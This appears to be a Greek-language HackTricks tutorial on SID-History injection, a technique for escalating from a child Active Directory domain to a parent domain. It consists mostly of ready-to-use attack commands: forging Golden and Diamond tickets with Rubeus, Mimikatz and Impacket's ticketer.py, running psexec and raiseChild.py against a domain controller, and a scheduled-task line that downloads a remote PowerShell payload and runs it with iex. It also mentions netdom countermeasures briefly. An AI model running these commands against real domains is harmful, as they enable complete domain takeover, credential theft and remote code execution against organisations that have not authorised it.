# Έγχυση SID-History

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση έγχυσης SID History

Ο στόχος της **επίθεσης έγχυσης SID History** είναι να διευκολύνει τη **μετεγκατάσταση χρηστών μεταξύ domains**, διασφαλίζοντας παράλληλα τη συνεχιζόμενη πρόσβαση σε πόρους του πρώην domain. Αυτό επιτυγχάνεται με την **ενσωμάτωση του προηγούμενου Security Identifier (SID) του χρήστη στο SID History** του νέου λογαριασμού του. Συγκεκριμένα, αυτή η διαδικασία μπορεί να χρησιμοποιηθεί καταχρηστικά για την παροχή μη εξουσιοδοτημένης πρόσβασης, προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή οι Domain Admins) από το parent domain στο SID History. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του parent domain.<sup>[[1]](#references)[[2]](#references)</sup>

Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.

Για να εντοπίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να βρείτε το SID του root domain. Μετά τον εντοπισμό του, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας το `-519` στο SID του root domain. Για παράδειγμα, αν το SID του root domain είναι `S-1-5-21-280534878-1496970234-700767426`, το SID της ομάδας "Enterprise Admins" θα είναι `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>

Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, των οποίων το SID τελειώνει σε **512**.

Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας από το άλλο domain (για παράδειγμα, των "Domain Admins") είναι με:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Σημειώστε ότι είναι δυνατή η απενεργοποίηση του SID history σε μια trust relationship, γεγονός που θα προκαλέσει αποτυχία αυτής της επίθεσης.

Σύμφωνα με τα [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
- **Απενεργοποίηση του SIDHistory σε forest trusts** με χρήση του netdom tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Εφαρμογή του SID Filter Quarantining σε external trusts** με χρήση του netdom tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Η εφαρμογή του SID Filtering σε domain trusts εντός ενός single forest** δεν συνιστάται, καθώς πρόκειται για unsupported configuration και μπορεί να προκαλέσει breaking changes. Αν ένα domain μέσα σε ένα forest δεν είναι αξιόπιστο, τότε δεν θα πρέπει να αποτελεί μέλος του forest. Σε αυτήν την περίπτωση, είναι απαραίτητο να διαχωριστούν πρώτα τα trusted και untrusted domains σε ξεχωριστά forests, ώστε να μπορεί να εφαρμοστεί SID Filtering σε ένα interforest trust

Δείτε αυτό το post για περισσότερες πληροφορίες σχετικά με το bypassing: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Την τελευταία φορά που το δοκίμασα, χρειάστηκε να προσθέσω το arg **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) με KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Για περισσότερες πληροφορίες σχετικά με τα golden tickets, δείτε:


{{#ref}}
golden-ticket.md
{{#endref}}


Για περισσότερες πληροφορίες σχετικά με τα diamond tickets, δείτε:


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Κάντε privilege escalation σε DA του root ή Enterprise admin χρησιμοποιώντας το KRBTGT hash του compromised domain:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Με τα δικαιώματα που αποκτήθηκαν από την επίθεση, μπορείτε, για παράδειγμα, να εκτελέσετε μια επίθεση DCSync στο νέο domain:


{{#ref}}
dcsync.md
{{#endref}}

### Από Linux

#### Χειροκίνητα με το [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Αυτόματα με χρήση του [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Πρόκειται για ένα script του Impacket που θα **αυτοματοποιήσει την κλιμάκωση από το child domain στο parent domain**. Το script χρειάζεται:

- Domain controller-στόχο
- Creds για έναν admin user στο child domain

Η ροή είναι:

- Λαμβάνει το SID του group Enterprise Admins του parent domain
- Ανακτά το hash για τον λογαριασμό KRBTGT στο child domain
- Δημιουργεί ένα Golden Ticket
- Συνδέεται στο parent domain
- Ανακτά τα credentials για τον λογαριασμό Administrator στο parent domain
- Αν έχει καθοριστεί το switch `target-exec`, πραγματοποιεί authentication στον Domain Controller του parent domain μέσω Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Αναφορές

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Τι είναι το Security Identifier (SID); - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Ζητήματα ασφαλείας για τα Trusts - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - Το Sid Filter ως όριο ασφαλείας μεταξύ domains, Μέρος 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
